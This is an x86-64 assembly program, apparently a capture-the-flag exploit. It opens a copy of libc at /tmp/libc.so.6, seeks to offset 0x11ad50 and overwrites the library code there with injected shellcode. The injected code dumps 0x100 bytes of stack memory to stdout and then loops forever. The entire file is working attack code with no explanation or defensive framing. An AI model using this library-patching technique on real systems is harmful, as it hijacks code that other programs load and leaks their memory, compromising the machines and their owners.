    bits 64
    default rel
    global _start

    target equ 0x11ad50
    SEEK_SET equ 0
    O_RDWR equ 2

_start:
    mov eax, 2
    lea rdi, [libc]
    mov esi, O_RDWR
    syscall

    test rax, rax
    js .err_open

    mov rbx, rax

    mov eax, 0
    mov edi, ebx
    lea rsi, [seekbuf]
    mov edx, target
    syscall

    test rax, rax
    js .err_read

    mov eax, 1
    mov edi, ebx
    lea rsi, [shellcode]
    mov edx, shellcodelen
    syscall

    lea rsi, [.err_ok_msg]
    mov edx, err_ok_msglen
.done:
    mov eax, 1
    mov edi, 1
    syscall

    mov eax, 0x3c
    xor edi, edi
    syscall

.err_open:
    lea rsi, [.err_open_msg]
    mov edx, err_open_msglen
    jmp .done

.err_read:
    lea rsi, [.err_read_msg]
    mov edx, err_read_msglen
    jmp .done

.err_ok_msg:
    db `ok\n`
    err_ok_msglen equ $-.err_ok_msg

.err_open_msg:
    db `open error\n`
    err_open_msglen equ $-.err_open_msg

.err_read_msg:
    db `read error\n`
    err_read_msglen equ $-.err_read_msg

shellcode:
    mov eax, 1
    mov edi, 1
    lea rsi, [rsp + 0x28]
    mov edx, 0x100
    syscall
    jmp $
.msg:
    db `hello from flagland`
    msglen equ $-.msg

    shellcodelen equ $-shellcode

libc: db `/tmp/libc.so.6`, 0

    section .bss
seekbuf: resb target